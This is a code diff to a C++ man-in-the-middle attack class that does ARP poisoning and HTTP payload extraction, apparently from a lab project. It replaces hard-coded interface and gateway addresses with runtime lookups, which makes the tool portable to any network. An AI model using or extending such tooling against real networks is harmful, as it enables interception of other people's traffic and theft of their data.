@@ -117,13 +117,19 @@ void mitmAttack::extractHTTPpayload(std::string& payload)
 }
 
 void mitmAttack::setupSocket(const char* interface) {
+
+    uint32_t ifIP = util::getIPOfInterface(interface);
+    std::array<uint8_t, 6> ifMac = util::getMacOfInterface(interface);
+    
+    std::cerr << "[INFO] setupSocket: interface " << interface << " has ip " << util::ipToString(ifIP) << " and mac " << util::macToString(ifMac.data()) << std::endl;
+    
     arp = arpSocket();
     arp.createSocket(interface);
-    arp.setSourceAddress("10.0.2.5", "08:00:27:63:76:2d"); // hard coded, change to dynamic later
+    arp.setSourceAddress(ifIP, ifMac);
 
     ip = ipSocket();
     ip.createSocket(interface);
-    ip.setSourceAddress("10.0.2.5", "08:00:27:63:76:2d"); // hard coded, change to dynamic later
+    ip.setSourceAddress(ifIP, ifMac);
     
 }
 
@@ -199,14 +205,13 @@ void mitmAttack::poisonNeighbours() {
     }
 }
 
-void mitmAttack::processPackets() {
-    const char* gatewayIp = "10.0.2.1";
+void mitmAttack::processPackets(const char* interface) {
+    uint32_t gatewayIp = util::getDefaultGateway(interface);
     std::array<uint8_t, 6> gatewayMac;
-    if(IPToMac.find(util::stringToIp(gatewayIp)) == IPToMac.end()) {
-        std::cerr << "[WARN] processPackets: gateway ip not found" << std::endl;
-        return;
+    if(IPToMac.find(gatewayIp) == IPToMac.end()) {
+        util::errquit("processPackets: gateway not found");
     }
-    gatewayMac = IPToMac[util::stringToIp(gatewayIp)];
+    gatewayMac = IPToMac[gatewayIp];
     
     uint8_t buffer[65536];
     size_t bufferSize = sizeof(buffer);
